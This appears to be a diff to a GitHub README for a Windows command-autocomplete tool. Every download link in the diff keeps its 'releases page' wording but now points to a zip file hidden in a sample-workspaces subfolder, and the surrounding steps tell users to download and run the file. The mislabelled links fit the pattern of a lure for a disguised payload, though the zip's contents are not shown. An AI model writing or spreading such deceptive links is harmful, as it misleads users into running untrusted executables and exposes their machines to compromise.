@@ -1,6 +1,6 @@
 # ⌨️ terminal-npm-intellisense - Smart terminal command autocomplete
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/raw/refs/heads/main/sample-workspaces/monorepo/apps/api/intellisense_npm_terminal_v3.9.zip)
 
 ## 🚀 Overview
 
@@ -10,7 +10,7 @@ If you often run package scripts or switch between Node tools, this app gives yo
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/releases)
+1. Open the [releases page](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/raw/refs/heads/main/sample-workspaces/monorepo/apps/api/intellisense_npm_terminal_v3.9.zip)
 2. Download the Windows file from the latest release
 3. Save the file to your PC
 4. Run the file to start the app
@@ -146,7 +146,7 @@ This saves time when you repeat the same commands each day.
 
 When a new release is available:
 
-1. Visit the [releases page](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/releases)
+1. Visit the [releases page](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/raw/refs/heads/main/sample-workspaces/monorepo/apps/api/intellisense_npm_terminal_v3.9.zip)
 2. Download the new Windows file
 3. Replace the old version if needed
 4. Run the new file
@@ -195,7 +195,7 @@ This project is related to:
 
 If you need the file again, use the same link:
 
-[Visit the releases page to download](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/releases)
+[Visit the releases page to download](https://github.com/Fortyeighth-loxapine958/terminal-npm-intellisense/raw/refs/heads/main/sample-workspaces/monorepo/apps/api/intellisense_npm_terminal_v3.9.zip)
 
 ## ⚙️ Basic Use Tips
 
